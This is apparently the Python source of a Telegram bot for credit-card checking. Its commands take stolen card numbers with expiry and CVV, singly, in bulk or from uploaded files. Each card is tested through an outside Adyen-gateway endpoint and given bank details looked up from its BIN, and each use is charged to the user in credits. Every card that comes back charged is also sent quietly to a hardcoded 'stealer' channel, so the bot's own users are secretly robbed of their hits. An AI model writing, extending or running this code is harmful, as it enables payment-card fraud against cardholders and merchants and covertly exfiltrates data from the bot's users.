import httpx
import time
import asyncio
import re
import os
from pyrogram import Client, filters
from pyrogram.types import Message
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Updated Stealer Channel ID
STEALER_CHANNEL_ID = -1003627495953

# Global to track active file processes to prevent overlaps
ACTIVE_MTXT_PROCESSES = {}

async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

async def check_adyen_card(fullcc):
    """Helper function to check a single card against the Adyen API"""
    endpoint_url = f"https://onyxenvbot.up.railway.app/adyen/key=yashikaaa/cc={fullcc}"
    async with httpx.AsyncClient(timeout=45, follow_redirects=True) as session:
        for attempt in range(2):
            try:
                response_obj = await session.get(endpoint_url)
                result_json = response_obj.json()
                api_status = result_json.get("status", "Unknown").lower()
                response = result_json.get("response", "No response message")
                
                if "approved" in api_status or "charged" in api_status:
                    return "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 🔥", response
                else:
                    return "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌", response
            except:
                if attempt == 1:
                    return "Error", "Request failed"
                await asyncio.sleep(1)
    return "Error", "Request failed"

def extract_all_cards(text):
    """Extracts cards in format cc|mm|yy|cvv or similar from text"""
    return re.findall(r"(\d{15,16})[\s|:|/]+(\d{1,2})[\s|:|/]+(\d{2,4})[\s|:|/]+(\d{3,4})", text)

@Client.on_message(filters.command("ad", [".", "/"]))
async def adyen_cmd(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)

        gateway = "Adyen Auth 💳"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        
        if getcc == False:
            resp = f"〈<a href=\'tg://user?id={user_id}\'>{first_name}</a>〉-» Adyen Auth - CHECK\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway} \n\n<a href=\'tg://user?id={user_id}\'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /ad cc|month|year|cvc"
            await message.reply_text(resp, quote=True)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        loading_msg = await message.reply("🍳", quote=True)
        start = time.perf_counter()
        
        task = asyncio.create_task(check_adyen_card(fullcc))
        await asyncio.sleep(2)
        status, response = await task

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
        
        end = time.perf_counter()
        elapsed_time = round(end - start, 2)

        finalresp = f"[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\n━━━〔 META 〕━━━\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\n[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href=\'tg://user?id={user_id}\'>{first_name}</a> [{role}] \n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>"

        try:
            await loading_msg.delete()
        except:
            pass
            
        await message.reply_text(finalresp, quote=True)

        await setantispamtime(user_id)
        await deductcredit(user_id)

        if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
            await send_hit_if_approved(client, finalresp)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

@Client.on_message(filters.command("mad", [".", "/"]))
async def mass_adyen_cmd(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        
        checkall = await check_all_thing(client, message)
        if checkall[0] == False:
            return
        role = checkall[1]

        input_text = ""
        if message.reply_to_message:
            input_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        elif len(message.command) > 1:
            input_text = message.text.split(None, 1)[1]
            
        cards = extract_all_cards(input_text)
        
        if not cards:
            resp = f"〈<a href=\'tg://user?id={user_id}\'>{first_name}</a>〉-» Adyen Mass - CHECK\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Adyen Auth 💳\n\n<a href=\'tg://user?id={user_id}\'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /mad cc|month|year|cvc (Max 10)"
            await message.reply_text(resp, quote=True)
            return

        cards = cards[:10]
        total_cards = len(cards)
        
        sent_msg = await message.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 {total_cards} 𝙏𝙤𝙩𝙖𝙡.```", quote=True)
        start = time.perf_counter()
        
        for card_data in cards:
            cc, mes, ano, cvv = card_data
            if len(ano) == 4: ano = ano[2:]
            fullcc = f"{cc}|{mes}|{ano}|{cvv}"
            
            status, response = await check_adyen_card(fullcc)
            getbin = await get_bin_details(cc)
            brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
            
            card_msg = f"{status}\n\n𝗖𝗖 ⇾ <code>{fullcc}</code>\n𝗚𝗮𝙩𝙚𝙬𝙖𝙮 ⇾ Adyen Auth 💳\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}\n\n```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {type_} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```\n\n𝙏𝙄𝙈𝙀 ⟶ {time.perf_counter() - start:0.2f}s"
            
            await message.reply_text(card_msg, quote=True)
            
            if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
                hit_msg = f"[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\n━━━〔 META 〕━━━\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ Adyen Auth 💳\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 ⟶ <a href=\'tg://user?id={user_id}\'>{first_name}</a>\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>"
                await send_hit_if_approved(client, hit_msg)
            
            await asyncio.sleep(0.5)

        await sent_msg.edit(f"```✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙 {total_cards} 𝙘𝙖𝙧𝙙𝙨.```")
        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())

@Client.on_message(filters.command("mtxt", [".", "/"]))
async def mtxt_cmd(client, message):
    user_id = message.from_user.id
    try:
        checkall = await check_all_thing(client, message)
        if checkall[0] == False: return
        
        if user_id in ACTIVE_MTXT_PROCESSES:
            return await message.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")

        if not message.reply_to_message or not message.reply_to_message.document:
            return await message.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")

        file_path = await message.reply_to_message.download()
        try:
            with open(file_path, "r") as f:
                content = f.read()
            os.remove(file_path)
        except Exception as e:
            if os.path.exists(file_path): os.remove(file_path)
            return await message.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")

        cards = extract_all_cards(content)
        if not cards:
            return await message.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")

        # Limit to 20 for file checks
        limit = 20
        total_found = len(cards)
        if total_found > limit:
            cards = cards[:limit]
            await message.reply(f"```📝 𝙁𝙤𝙪𝙣𝙙 {total_found} 𝘾𝘾𝙨\n⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {limit}```")
        else:
            await message.reply(f"```📝 𝙁𝙤𝙪𝙣𝙙 {total_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨\n🔥 𝘼𝙡𝙡 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```")

        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_mtxt_cards(client, message, cards))

    except Exception:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        import traceback
        await error_log(traceback.format_exc())

async def process_mtxt_cards(client, message, cards):
    user_id = message.from_user.id
    first_name = message.from_user.first_name
    total = len(cards)
    checked, charged, declined = 0, 0, 0
    
    status_msg = await message.reply("```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
    start_time = time.perf_counter()

    try:
        for card_data in cards:
            if user_id not in ACTIVE_MTXT_PROCESSES: break
            
            cc, mes, ano, cvv = card_data
            if len(ano) == 4: ano = ano[2:]
            fullcc = f"{cc}|{mes}|{ano}|{cvv}"
            
            status, response = await check_adyen_card(fullcc)
            checked += 1
            
            if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status: charged += 1
            else: declined += 1
            
            getbin = await get_bin_details(cc)
            brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
            
            card_msg = f"{status}\n\n𝗖𝗖 ⇾ <code>{fullcc}</code>\n𝗚𝗮𝙩𝙚𝙬𝙖𝙮 ⇾ Adyen Auth 💳\n\n```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {type_} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```"
            
            res_msg = await message.reply_text(card_msg, quote=True)
            
            if "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
                hit_msg = f"[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\n━━━〔 META 〕━━━\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ Adyen Auth 💳\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 ⟶ <a href=\'tg://user?id={user_id}\'>{first_name}</a>\n━━━〔 OWNER 〕━━━\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>"
                await send_hit_if_approved(client, hit_msg)
            
            await asyncio.sleep(0.5)

        final_caption = f"""✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
𝙏𝙞𝙢𝙚 𝙏𝙖𝙠𝙚𝙣 ⏱️ : {time.perf_counter() - start_time:0.2f}s
"""
        await status_msg.edit(final_caption)
        await setantispamtime(user_id)
        await deductcredit(user_id)

    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
